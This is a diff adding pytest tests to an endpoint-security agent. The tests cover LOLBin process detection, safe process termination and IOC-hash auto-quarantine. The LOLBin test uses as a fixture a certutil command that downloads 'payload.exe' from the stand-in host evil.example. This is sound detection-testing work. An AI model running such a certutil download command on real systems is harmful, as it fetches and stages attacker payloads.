@@ -303,3 +303,57 @@ def test_network_c2_socket_auditor(tmp_path, monkeypatch):
     assert flagged_ports == {4444, 443}
     logs = store.list_audit_logs(limit=10)
     assert any(row["action_taken"] == "FLAGGED_C2_SOCKET" for row in logs)
+
+
+def test_lolbin_heuristic_and_safe_termination(monkeypatch):
+    import os
+    import psutil
+
+    agent = CogniGuardAgent()
+    lol = agent.evaluate_process_info(
+        pid=8181,
+        name="certutil.exe",
+        exe_path="C:\\Windows\\System32\\certutil.exe",
+        cmdline=["certutil.exe", "-urlcache", "-f", "http://evil.example/payload.exe", "out.exe"],
+    )
+    assert lol is not None
+    assert "LOLBin" in lol["reason"]
+    assert agent.evaluate_process_info(pid=8182, name="certutil.exe", cmdline=["certutil.exe", "-dump"]) is None
+
+    terminated = []
+
+    class FakeProc:
+        def __init__(self, pid):
+            self.pid = pid
+
+        def terminate(self):
+            terminated.append(self.pid)
+
+    monkeypatch.setattr(psutil, "Process", FakeProc)
+    res = agent.terminate_flagged_processes([{"pid": os.getpid()}, {"pid": 0}, {"pid": 8181}, {"pid": 8181}])
+    assert terminated == [8181]
+    assert res == [{"pid": 8181, "status": "TERMINATED"}]
+
+
+def test_full_system_scanner_ioc_and_auto_quarantine(tmp_path):
+    import hashlib
+    from agent.full_system_scanner import FullSystemGuardian
+
+    store = CogniGuardStore(str(tmp_path / "sys_ioc.db"))
+    vault = QuarantineManager(vault_dir=str(tmp_path / "sys_vault"), store=store)
+    scan_root = tmp_path / "scan_home"
+    scan_root.mkdir()
+
+    payload = b"known-ioc-dropper-content"
+    store.add_ioc(hashlib.sha256(payload).hexdigest(), "LockBit_Note_Dropper", "CRITICAL")
+    bad_file = scan_root / "invoice_notes.txt"
+    bad_file.write_bytes(payload)
+
+    guardian = FullSystemGuardian(store=store, quarantine_manager=vault, auto_quarantine=True)
+    guardian.scan_targets = [str(scan_root)]
+    guardian.scan_full_system(max_files=50)
+
+    assert len(guardian.flagged_threats) == 1
+    assert "LockBit_Note_Dropper" in guardian.flagged_threats[0]["type"]
+    assert not bad_file.exists()
+    assert len(store.list_quarantine_items(status="QUARANTINED")) == 1
